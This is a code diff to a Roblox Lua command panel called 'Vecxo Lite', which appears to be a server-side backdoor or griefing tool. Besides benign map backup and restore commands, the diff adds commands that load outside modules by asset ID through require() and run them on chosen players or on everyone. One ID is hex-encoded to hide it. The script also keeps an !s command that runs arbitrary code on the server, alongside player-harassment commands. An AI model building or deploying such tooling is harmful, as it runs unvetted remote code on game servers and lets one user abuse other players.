@@ -54,6 +54,13 @@ local bannedPlayers = {}
 
 local TweenService = game:GetService("TweenService")
 
+local ServerStorage = game:GetService("ServerStorage")
+
+local mapBackup = Instance.new("Folder")
+mapBackup.Name = "MapBackup"
+mapBackup.Parent = ServerStorage
+
+
 local function notify(player, title, message)
 coroutine.wrap(function()
 	local gui = Instance.new("ScreenGui")
@@ -361,10 +368,18 @@ local function showCommandGui(player)
 		"9 - !hang <plr|all|others|random|friends>",
 		"10 - !crucify <plr|all|others|random|friends>",
 		"11 - !guil <plr|all|others|random|friends>",
-		"12 - !s <code>",
-		"13 - !clr - Cleans the server of junk",
-		"14 - !shutdown - Shuts the server down",
-		"15 - !wls - View whitelisted users in current server"
+		"12 - !stickbeater <plr|all|others|random|friends>",
+		"13 - !knife <plr|all|others|random|friends>",
+		"14 - !magician <plr|all|others|random|friends>",
+		"15 - !bombvest <plr|all|others|random|friends>",
+		"16 - !toolgun <plr|all|others|random|friends>",
+		"17 - !gentk <plr|all|others|random|friends>",
+		"18 - !dex <plr|all|others|random|friends>",
+		"19 - !s <code>",
+		"20 - !clr - Cleans the server of junk",
+		"21 - !shutdown - Shuts the server down",
+		"22 - !wls - View whitelisted users in current server",
+		"23 - !bans - View banned players from the current server"
 		--"10 - !restart"
 	}
 
@@ -696,6 +711,31 @@ local function processCommand(sender, msg)
 			end
 		end
 		notifyv2(sender, "[Vecxo Lite]", "✅ Workspace cleared successfully")
+	elseif cmd == "!backupmap" then
+		if mapBackup then mapBackup:ClearAllChildren() end
+
+		for _, item in ipairs(workspace:GetChildren()) do
+			if not item:IsA("Terrain") and not item:IsA("Camera") and not Players:GetPlayerFromCharacter(item) then
+				local cloned = item:Clone()
+				cloned.Parent = mapBackup
+			end
+		end
+
+		notifyv2(sender, "[Vecxo Lite]", "✅ Map has been backed up.")
+		
+	elseif cmd == "!restoremap" then
+		for _, item in ipairs(workspace:GetChildren()) do
+			if not item:IsA("Terrain") and not item:IsA("Camera") and not Players:GetPlayerFromCharacter(item) then
+				item:Destroy()
+			end
+		end
+
+		for _, backupItem in ipairs(mapBackup:GetChildren()) do
+			local clone = backupItem:Clone()
+			clone.Parent = workspace
+		end
+
+		notifyv2(sender, "[Vecxo Lite]", "✅ Map has been restored from backup.")
 	elseif cmd == "!s" then
 		local code = msg:sub(4)
 		if code == "" then
@@ -726,6 +766,48 @@ local function processCommand(sender, msg)
 		showCommandGui(sender)
 	elseif cmd == "!bans" then
 		showBannedList(sender, bannedPlayers)
+	elseif cmd == "!stickbeater" and args[2] then
+		local targets = GetPlayers(args[2], sender)
+		for i, plr in ipairs(targets) do
+			require(5813743814).load(plr.Name)
+			notifyv2(sender, "[Vecxo Lite]", "✅ Ran stick beater on " ..plr.Name.." successfully")
+		end
+	elseif cmd == "!knife" and args[2] then
+		local targets = GetPlayers(args[2], sender)
+		for i, plr in ipairs(targets) do
+			require(74444736936643)(plr.Name, "Grab Knife V1")
+			notifyv2(sender, "[Vecxo Lite]", "✅ Ran grab knife V1 on " ..plr.Name.." successfully")
+		end	
+	elseif cmd == "!magician" and args[2] then
+		local targets = GetPlayers(args[2], sender)
+		for i, plr in ipairs(targets) do
+			require(6438184104).load(plr.Name)
+			notifyv2(sender, "[Vecxo Lite]", "✅ Ran magician on " ..plr.Name.." successfully")
+		end
+	elseif cmd == "!bombvest" and args[2] then
+		local targets = GetPlayers(args[2], sender)
+		for i, plr in ipairs(targets) do
+			require(0x49731b7f).load(plr.Name)
+			notifyv2(sender, "[Vecxo Lite]", "✅ Ran bomb vest on " ..plr.Name.." successfully")
+		end
+	elseif cmd == "!toolgun" and args[2] then
+		local targets = GetPlayers(args[2], sender)
+		for i, plr in ipairs(targets) do
+			require(14108404712).mingebag(plr.Name)
+			notifyv2(sender, "[Vecxo Lite]", "✅ Ran tool gun on " ..plr.Name.." successfully")
+		end
+	elseif cmd == "!dex" and args[2] then
+		local targets = GetPlayers(args[2], sender)
+		for i, plr in ipairs(targets) do
+			require(12146718110):Fire(plr.Name)
+			notifyv2(sender, "[Vecxo Lite]", "✅ Ran DEX explorer on " ..plr.Name.." successfully")
+		end
+	elseif cmd == "!gentk" and args[2] then
+		local targets = GetPlayers(args[2], sender)
+		for i, plr in ipairs(targets) do
+			require(5430831931).Dark(plr.Name)
+			notifyv2(sender, "[Vecxo Lite]", "✅ Gentleman's killer ran on " ..plr.Name.." successfully")
+		end
 	elseif cmd == "!hang" and args[2] then
 		local targets = GetPlayers(args[2], sender)
 		for i, plr in ipairs(targets) do
